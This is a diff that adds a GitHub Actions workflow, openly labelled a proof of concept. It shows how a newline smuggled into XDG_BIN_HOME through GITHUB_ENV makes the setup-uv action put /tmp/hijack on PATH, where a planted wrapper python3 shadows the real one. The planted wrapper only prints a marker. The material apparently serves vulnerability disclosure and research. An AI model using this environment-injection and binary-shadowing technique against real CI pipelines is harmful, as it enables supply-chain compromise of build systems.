@@ -1,0 +1,42 @@
+name: addPath Real setup-uv Chain PoC
+on:
+  workflow_dispatch:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Step 1 - Compromised action sets XDG_BIN_HOME with newline
+        run: |
+          # A compromised composite action would do this
+          delimiter="ghadelimiter_$(uuidgen)"
+          echo "XDG_BIN_HOME<<${delimiter}" >> $GITHUB_ENV
+          printf '/opt/legit/bin\n/tmp/hijack' >> $GITHUB_ENV
+          echo "" >> $GITHUB_ENV
+          echo "${delimiter}" >> $GITHUB_ENV
+          
+          # Also plant a trojan
+          mkdir -p /tmp/hijack
+          cat > /tmp/hijack/python3 << 'TROJAN'
+          #!/bin/bash
+          echo "[HIJACKED] python3 replaced by /tmp/hijack/python3" >&2
+          /usr/bin/python3 "$@"
+          TROJAN
+          chmod +x /tmp/hijack/python3
+      
+      - name: Step 2 - Real setup-uv reads XDG_BIN_HOME and addPaths it
+        uses: astral-sh/setup-uv@v6
+        with:
+          version: "0.7.0"
+      
+      - name: Step 3 - Check if PATH was hijacked
+        run: |
+          echo "=== PATH entries (first 10) ==="
+          echo "$PATH" | tr ':' '\n' | head -10
+          echo ""
+          if echo "$PATH" | tr ':' '\n' | grep -q "/tmp/hijack"; then
+            echo "REAL-WORLD CHAIN CONFIRMED: /tmp/hijack in PATH via setup-uv"
+            echo "which python3: $(which python3)"
+          else
+            echo "PATH not hijacked (setup-uv may have changed behavior)"
+          fi
